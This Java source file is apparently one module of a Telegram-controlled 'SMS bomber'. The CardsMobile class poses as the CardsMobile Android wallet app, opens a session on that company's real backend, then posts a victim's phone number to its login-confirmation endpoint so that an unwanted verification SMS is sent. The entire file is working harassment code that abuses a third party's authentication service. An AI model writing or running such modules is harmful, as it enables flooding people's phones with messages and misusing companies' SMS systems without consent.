package com.example.webapp.telegram.bomber.services;


import com.example.webapp.telegram.bomber.services.utils.Callback;
import com.example.webapp.telegram.bomber.services.utils.Service;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.springframework.lang.NonNull;

public class CardsMobile extends Service {

    @Override
    public void run(OkHttpClient client, Callback callback) {
        JSONObject json = new JSONObject();
        JSONObject application = new JSONObject();

        try {
            application.put("applicationName", "ru.cardsmobile.mw3");
            application.put("applicationVersion", "7.40.2");
            application.put("gsonDiscriminator", "com.cardsmobile.aaa.api.AndroidMobileWallet");
            application.put("secured", true);

            json.put("application", application);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        client.newCall(new Request.Builder()
                .url("https://service-a.cardsmobile.ru/aaa/session/")
                .post(RequestBody.create(MediaType.parse("application/json"), json.toString()))
                .build()).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try {
                    JSONObject json = new JSONObject(response.body().string());

                    client.newCall(new Request.Builder()
                            .url("https://service-a.cardsmobile.ru/aaa/session/" +
                                    json.getJSONObject("sessionOptions")
                                            .getString("sessionId")
                                    + "/account/login/confirmation/msisdn/request")
                            .post(RequestBody.create(MediaType.parse("application/json"), getFormattedPhone()))
                            .build()).enqueue(callback);
                } catch (JSONException | NullPointerException e) {
                    callback.onError(e);
                }
            }
        });
    }
}
